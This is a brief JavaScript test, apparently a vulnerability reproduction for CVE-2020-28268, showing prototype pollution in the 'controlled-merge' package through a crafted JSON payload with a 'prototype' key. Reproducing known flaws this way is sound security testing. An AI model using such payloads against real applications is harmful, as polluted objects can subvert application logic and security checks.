//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
test("prototype pollution in controlled-merge ", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require("controlled-merge");
  const obj = merge(
    {},
    JSON.parse(
      '{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'
    ),
    true
  );

  expect(obj.prototype.polluted).toBe("yes");
});
